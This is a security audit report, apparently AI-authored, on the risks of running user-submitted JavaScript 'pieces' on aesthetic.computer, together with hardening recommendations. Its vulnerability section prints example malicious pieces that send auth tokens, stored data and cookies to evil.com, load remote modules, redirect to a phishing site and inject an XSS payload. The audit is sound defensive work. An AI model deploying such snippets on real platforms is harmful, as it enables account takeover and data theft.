# Security Analysis: JavaScript Piece Execution API
**Date:** 2026-02-12
**Scope:** `/api/store-piece` and user-submitted .mjs pieces
**Status:** 🔴 **CRITICAL SECURITY CONCERNS**

---

## Executive Summary

The current implementation of `/api/store-piece` allows **arbitrary JavaScript code execution with minimal sandboxing**. User-submitted pieces have access to:

- ✅ Network requests (fetch, WebSocket)
- ✅ Persistent storage (IndexedDB)
- ✅ Authentication tokens
- ✅ File upload/download
- ✅ Dynamic code loading
- ✅ Navigation control

**Verdict:** The API surface is **NOT suitable for untrusted code** in its current form.

---

## 1. Attack Surface Analysis

### 1.1 Code Execution Model

**How pieces are loaded:**
```javascript
// From disk.mjs:7488
const blob = new Blob([updatedCode], { type: "application/javascript" });
const blobUrl = URL.createObjectURL(blob);
loadedModule = await import(blobUrl);
```

**Execution context:**
- **Web Worker mode** (default): Limited DOM access, but full Web API access
- **noWorker mode** (fallback): Full main thread access including DOM
- **No code validation**: Source code is executed as-is without sanitization

### 1.2 The $ API Object

The `$` parameter passed to piece functions contains:

```javascript
// From disk.mjs:11600-11604
const $api = {
  ...commonApi,    // Network, system control, auth
  ...updateApi,    // Rendering, input handling
  ...painting.api, // Drawing APIs
  store,           // IndexedDB wrapper
  net: {
    preload,       // fetch() wrapper
    userRequest,   // Authenticated HTTP
    getToken,      // Auth token retrieval
    signup,        // Auth operations
    // ... more
  },
  jump,            // Navigation
  upload,          // File upload
  download,        // File download
  authorize,       // Request auth tokens
  Socket,          // WebSocket access
  Chat,            // Chat system
  wallet,          // Crypto wallet
  // ... 100+ more APIs
};
```

---

## 2. Critical Vulnerabilities

### 🚨 2.1 Authentication Token Theft

**Risk:** Pieces can steal user authentication tokens and send them to external servers.

```javascript
// Malicious piece example
export async function boot($) {
  const token = await $.authorize();
  await fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token })
  });
}
```

**Impact:** Complete account compromise.

---

### 🚨 2.2 Data Exfiltration

**Risk:** Pieces can read all user data from storage and upload it externally.

```javascript
// Malicious piece example
export async function boot($) {
  // Read all user paintings
  const paintings = await $.store.get('paintings');

  // Read all stored data
  const allKeys = await $.store.keys();
  const allData = {};
  for (const key of allKeys) {
    allData[key] = await $.store.get(key);
  }

  // Exfiltrate
  await $.net.preload('https://evil.com/exfil', {
    method: 'POST',
    body: JSON.stringify(allData)
  });
}
```

**Impact:** Privacy breach, GDPR violations.

---

### 🚨 2.3 Persistent Malware

**Risk:** Pieces can install persistent malicious code in IndexedDB.

```javascript
// Malicious piece that persists
export async function boot($) {
  // Store malicious code for future execution
  await $.store.set('malware', `
    setInterval(() => {
      fetch('https://evil.com/beacon', {
        method: 'POST',
        body: JSON.stringify({
          cookies: document.cookie,
          localStorage: {...localStorage}
        })
      });
    }, 60000);
  `);

  // Inject into other pieces via dynamic imports
  const malCode = await $.store.get('malware');
  eval(malCode);
}
```

**Impact:** Long-term compromise, difficult to detect/remove.

---

### 🚨 2.4 Supply Chain Attacks

**Risk:** Pieces can dynamically import other modules, including malicious ones.

```javascript
// Malicious piece loading external code
export async function boot($) {
  const maliciousModule = await import('https://evil.com/malware.mjs');
  maliciousModule.steal($);
}
```

**Impact:** Code integrity compromise, backdoor installation.

---

### 🚨 2.5 Phishing & Social Engineering

**Risk:** Pieces can control navigation and display fake UI.

```javascript
// Phishing piece
export async function boot($) {
  // Redirect to fake login page
  $.jump('https://aesthetic-computer-login.evil.com');
}

export function paint($) {
  // Or display fake login UI
  $.wipe('white');
  $.ink('black');
  $.write("Enter your password:", 100, 100);
  // Capture input and send to attacker
}
```

**Impact:** Credential theft, user deception.

---

### 🚨 2.6 Cross-Site Scripting (XSS)

**Risk:** In noWorker mode, pieces have DOM access.

```javascript
// XSS in noWorker mode
export function boot($) {
  if (typeof document !== 'undefined') {
    document.body.innerHTML += '<img src=x onerror="alert(document.cookie)">';
  }
}
```

**Impact:** Session hijacking, malware injection.

---

## 3. Current Security Measures (Insufficient)

### ✅ Web Worker Isolation
- **What it does:** Runs pieces in a separate thread without DOM access
- **Limitations:**
  - Workers still have full Web API access (fetch, IndexedDB, WebSocket)
  - Disabled in sandboxed iframes (falls back to main thread)
  - Can be bypassed via messaging

### ⚠️ Sandbox Detection
```javascript
// From bios.mjs:54-79
const inSandbox = window.origin === 'null';
if (inSandbox) {
  // Only disables workers, doesn't restrict capabilities
  boot({ sandbox: true, worker: false });
}
```

**What it does:** Detects sandboxed iframes
**What it doesn't do:** Actually sandbox piece capabilities

### ❌ No Code Validation
- No AST analysis
- No dangerous API blocking
- No Content Security Policy enforcement
- No code signing or verification

---

## 4. Comparison: KidLisp vs JavaScript Pieces

| Security Aspect | KidLisp | JavaScript Pieces |
|----------------|---------|-------------------|
| **Code execution** | Interpreted, sandboxed | Native JS, unrestricted |
| **Network access** | ❌ No | ✅ Full (fetch, WebSocket) |
| **Storage access** | ❌ No | ✅ Full (IndexedDB) |
| **Dynamic imports** | ❌ No | ✅ Yes |
| **File operations** | ❌ No | ✅ Upload/download |
| **Auth access** | ❌ No | ✅ Token access |
| **Attack surface** | 🟢 Minimal | 🔴 Extensive |

**KidLisp is significantly safer** due to its limited, interpreted execution model.

---

## 5. Recommended Security Measures

### 🔒 Priority 1: Immediate Actions

#### 5.1 Add Security Warnings
```javascript
// In store-piece.mjs
if (!user?.sub) {
  console.warn('⚠️  Publishing anonymous pieces allows arbitrary code execution');
}
```

Add visible warnings in documentation:
```markdown
⚠️ WARNING: JavaScript pieces execute with full API access.
Only run pieces from trusted sources.
```

#### 5.2 Implement Content Security Policy
```javascript
// Add CSP headers for piece execution contexts
{
  "Content-Security-Policy": [
    "default-src 'self'",
    "connect-src 'self' https://aesthetic.computer",
    "script-src 'self' 'unsafe-eval'", // Required for dynamic imports
    "object-src 'none'",
    "base-uri 'self'"
  ]
}
```

#### 5.3 Add Rate Limiting
```javascript
// In store-piece.mjs
const MAX_PIECES_PER_HOUR = user ? 100 : 10;
// Track and limit piece submissions per user/IP
```

---

### 🔒 Priority 2: Medium-Term Hardening

#### 5.4 Object Freezing (Partial Mitigation)
```javascript
// In disk.mjs - freeze sensitive APIs
const $api = Object.freeze({
  ...commonApi,
  net: Object.freeze({
    ...netApi,
    // Remove or restrict dangerous methods
    // preload: undefined,  // Or wrap with restrictions
  }),
  store: createRestrictedStore(), // Namespace storage per piece
  // Don't expose authorize, getToken directly
});
```

**Limitations:**
- Can't freeze prototype chains
- Doesn't prevent `Object.getPrototypeOf()` access
- Workers can still access global Web APIs directly

#### 5.5 API Allowlist System
```javascript
// Create restricted $ API for untrusted pieces
const $restrictedApi = {
  // Safe drawing APIs
  wipe: $.wipe,
  ink: $.ink,
  box: $.box,
  circle: $.circle,
  // ... other rendering APIs

  // Safe input APIs
  event: $.event,

  // Namespaced storage (can't access other pieces' data)
  store: createNamespacedStore(pieceCode),

  // NO network, NO auth, NO file operations
};
```

#### 5.6 Code Signing & Verification
```javascript
// Require pieces to be signed by trusted authors
export async function verifyPiece(source, signature, publicKey) {
  const encoder = new TextEncoder();
  const data = encoder.encode(source);
  const key = await crypto.subtle.importKey(/* ... */);
  return await crypto.subtle.verify('RSASSA-PKCS1-v1_5', key, signature, data);
}
```

---

### 🔒 Priority 3: Long-Term Architecture

#### 5.7 Trusted vs Untrusted Execution Modes

**Option A: Two-Tier System**
```javascript
// Untrusted pieces (anonymous, new users)
const $untrustedApi = {
  // Only safe rendering + input APIs
  // No network, storage, auth
};

// Trusted pieces (verified users, signed code)
const $trustedApi = {
  // Full API access
};
```

**Option B: Permission System**
```javascript
// Pieces declare required permissions
export const permissions = ['network', 'storage:read'];

// Users approve before execution
if (await requestPermissions(permissions)) {
  runPiece($apiWithPermissions);
}
```

#### 5.8 WebAssembly Sandbox
- Compile pieces to WebAssembly with restricted imports
- Use WASI for controlled I/O
- More complex but provides true sandboxing

#### 5.9 Server-Side Rendering
- Execute untrusted pieces server-side in isolated containers (Docker, Firecracker)
- Stream frames to client
- Most secure but highest latency

---

## 6. Risk Assessment

### Current Risk Level: 🔴 **CRITICAL**

| Threat | Likelihood | Impact | Overall Risk |
|--------|-----------|--------|--------------|
| Token theft | HIGH | CRITICAL | 🔴 CRITICAL |
| Data exfiltration | HIGH | HIGH | 🔴 CRITICAL |
| Persistent malware | MEDIUM | HIGH | 🟠 HIGH |
| Supply chain attack | MEDIUM | HIGH | 🟠 HIGH |
| Phishing | HIGH | MEDIUM | 🟠 HIGH |
| XSS (noWorker mode) | LOW | CRITICAL | 🟠 HIGH |

### With Priority 1 Measures: 🟠 **HIGH**
- Warnings reduce social engineering success
- Rate limiting reduces abuse scale
- Still fundamentally insecure

### With Priority 2 Measures: 🟡 **MEDIUM**
- Object freezing prevents some attacks
- API allowlist significantly reduces attack surface
- Code signing establishes trust model

### With Priority 3 Measures: 🟢 **LOW**
- True sandboxing prevents most attacks
- Permission system gives users control
- Defense in depth architecture

---

## 7. Specific Recommendations for `/api/store-piece`

### DO NOT:
- ❌ Accept pieces from untrusted sources without warnings
- ❌ Allow anonymous pieces without rate limiting
- ❌ Execute pieces with full $ API access by default
- ❌ Mix trusted and untrusted code in the same context

### DO:
- ✅ Add prominent security warnings in docs and UI
- ✅ Implement strict rate limiting (10/hour for anonymous)
- ✅ Freeze sensitive API objects
- ✅ Create restricted $ API for untrusted code
- ✅ Implement code signing for verified authors
- ✅ Add CSP headers
- ✅ Log all piece executions for abuse monitoring
- ✅ Consider permission-based system

---

## 8. Comparison to Industry Standards

### Similar Platforms & Their Security:

**CodePen / JSFiddle:**
- Execute in sandboxed iframes
- No access to parent page
- Limited storage (localStorage only, sandboxed)
- Network restricted by CORS

**Observable:**
- Limited API surface
- No direct fetch (uses proxy)
- Rate limiting
- Trusted notebook model

**Glitch / Replit:**
- Server-side execution in containers
- Process isolation
- Resource limits
- No client-side arbitrary code

**Chrome Extensions:**
- Manifest v3 with permissions
- Content Security Policy enforcement
- Review process
- Code signing required

**aesthetic.computer's model is closer to allowing arbitrary npm packages to run with full node.js access** - extremely dangerous.

---

## 9. Action Items

### Immediate (This Week):
1. [ ] Add security warnings to `/api/store-piece` docs
2. [ ] Add security warnings to API HTML page
3. [ ] Implement rate limiting (10/hour anonymous, 100/hour authenticated)
4. [ ] Add logging for all piece submissions
5. [ ] Update README with security considerations

### Short-Term (This Month):
1. [ ] Implement object freezing for sensitive APIs
2. [ ] Create restricted $ API variant
3. [ ] Add CSP headers
4. [ ] Build abuse monitoring dashboard
5. [ ] Implement piece signing infrastructure

### Medium-Term (Next Quarter):
1. [ ] Build permission system UI
2. [ ] Implement two-tier trusted/untrusted execution
3. [ ] Add code review process for verified pieces
4. [ ] Consider WebAssembly sandbox
5. [ ] Build piece marketplace with trust ratings

---

## 10. Conclusion

**The current `/api/store-piece` implementation is NOT suitable for untrusted code.**

While the creative freedom of full JavaScript execution is powerful, it creates **critical security vulnerabilities** including:
- Authentication compromise
- Data theft
- Persistent malware
- Phishing attacks

**Recommended Path Forward:**
1. **Immediately** add warnings and rate limiting
2. **Short-term** implement object freezing and restricted APIs
3. **Medium-term** build permission system and code signing
4. **Long-term** consider WebAssembly or server-side execution for untrusted code

**Alternative Approach:**
Consider promoting **KidLisp for untrusted/anonymous creation** (already safe) and restricting JavaScript pieces to verified, trusted authors only.

---

## Appendix A: Key File Locations

- **Piece loading**: `system/public/aesthetic.computer/lib/disk.mjs` (lines 7000-7600)
- **$ API construction**: `system/public/aesthetic.computer/lib/disk.mjs` (lines 11600-11604)
- **Network API**: `system/public/aesthetic.computer/lib/disk.mjs` (lines 4209-4373)
- **Storage API**: `system/public/aesthetic.computer/lib/store.mjs`
- **Main entry**: `system/public/aesthetic.computer/bios.mjs`
- **Store endpoint**: `system/netlify/functions/store-piece.mjs`

## Appendix B: Example Attack Code

See [attack-examples.md](./attack-examples.md) for detailed proof-of-concept exploits.

---

**Report prepared by:** Claude Sonnet 4.5
**Review status:** Requires human security review
**Next review date:** 2026-03-12
